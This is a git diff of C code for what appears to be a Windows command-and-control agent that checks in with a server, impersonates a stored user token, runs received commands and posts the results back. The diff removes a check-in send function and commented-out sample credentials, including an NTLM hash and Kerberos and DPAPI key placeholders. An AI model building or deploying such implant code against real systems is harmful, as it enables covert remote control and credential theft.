@@ -58,8 +58,6 @@ int main()
 
     generate_uuid4(heapStorePointer->agentStore->agent_id);
 
-    agent_send(heapStorePointer, "Client init Checkin");
-
     // // move to heapstruct
     // char agent_id[37];
     // generate_uuid4(agent_id);
@@ -132,12 +130,7 @@ void execution_setup(HeapStore *heapStorePointer)
 // Thread function for executing the command
 DWORD WINAPI execute(HeapStore *heapStorePointer)
 {
-
-    /*
-    Thread Stuff
-
-    */
-    agent_send(heapStorePointer, "Execution");
+    // agent_send_now(heapStorePointer, "Starting execution");
 
     // add a get token func here
     if (!set_thread_token(heapStorePointer->currentUserStore->token))
@@ -145,22 +138,7 @@ DWORD WINAPI execute(HeapStore *heapStorePointer)
         DEBUG_LOG("Could not set token!");
     }
 
-    // agentid = heapStorePointer->agentStore->agent_id
-
-    // bug somewhere in here. yay
-    //  add_credential("admin", "CORP",
-    //              "31d6cfe0d16ae931b73c59d7e0c089c0", NULL, "P@ssw0rd!",
-    //              "base64-KerbTGT", "aes128-key", "aes256-key",
-    //              "dpapi-master-key");
-
-    // display_credentials();
-
-    // get data out of exec args that is needed for execution
-    // rename to thread args otherwise it clashes with func arg
-    // EXEC_ARGS *thread_args = (EXEC_ARGS *)exec_args;
-
-    // char *agent_id = thread_args->agent_id;
-    // HeapStore *heapStorePointer = thread_args->heapStorePointer;
+    // Send + parse method
 
     // this fills in the command, arg and command_id
     InboundJsonDataStruct InboundJsonData = get_command_data(heapStorePointer->agentStore->agent_id);
@@ -218,64 +196,6 @@ DWORD WINAPI execute(HeapStore *heapStorePointer)
     free(OutboundJsonData);                      // freeing the strucutre itself: 'OutboundJsonDataStruct* OutboundJsonData = (OutboundJsonDataStruct*)calloc(1, sizeof(OutboundJsonDataStruct));'
 
     return 0;
-}
-
-// Mock simple send
-// a one off send thingy for sending messages with a randomly generated UUID
-void agent_send(HeapStore *heapStorePointer, const char *input)
-{
-    // Generate a new UUID for the oneoff message.
-    char uuid[37]; // Correctly declare a 37-byte character array.
-    generate_uuid4(uuid);
-
-    // Allocate and initialize an outbound JSON structure.
-    OutboundJsonDataStruct *OutboundJsonData = (OutboundJsonDataStruct *)calloc(1, sizeof(OutboundJsonDataStruct));
-    if (!OutboundJsonData)
-    {
-        DEBUG_LOG("Memory allocation failed for OutboundJsonData.\n");
-        return;
-    }
-
-    // Duplicate the agent ID from the heap store.
-    OutboundJsonData->agent_id = strdup(heapStorePointer->agentStore->agent_id);
-    if (!OutboundJsonData->agent_id)
-    {
-        DEBUG_LOG("Memory allocation failed for agent_id.\n");
-        free(OutboundJsonData);
-        return;
-    }
-
-    // Set the command result data to the input provided.
-    OutboundJsonData->command_result_data = strdup(input);
-    if (!OutboundJsonData->command_result_data)
-    {
-        DEBUG_LOG("Memory allocation failed for command_result_data.\n");
-        free(OutboundJsonData->agent_id);
-        free(OutboundJsonData);
-        return;
-    }
-
-    // Encode JSON using the agent_id, command_result_data, and generated uuid as command_id.
-    char *encoded_json_response = encode_json(OutboundJsonData->agent_id,
-                                              OutboundJsonData->command_result_data,
-                                              uuid);
-    if (!encoded_json_response)
-    {
-        DEBUG_LOG("Failed to encode JSON response.\n");
-        free(OutboundJsonData->agent_id);
-        free(OutboundJsonData->command_result_data);
-        free(OutboundJsonData);
-        return;
-    }
-
-    // Send the JSON message to the designated endpoint.
-    post_data(encoded_json_response, heapStorePointer->agentStore->agent_id);
-
-    // Free the allocated memory.
-    free(encoded_json_response);
-    free(OutboundJsonData->agent_id);
-    free(OutboundJsonData->command_result_data);
-    free(OutboundJsonData);
 }
 
 void generate_uuid4(char *uuid)
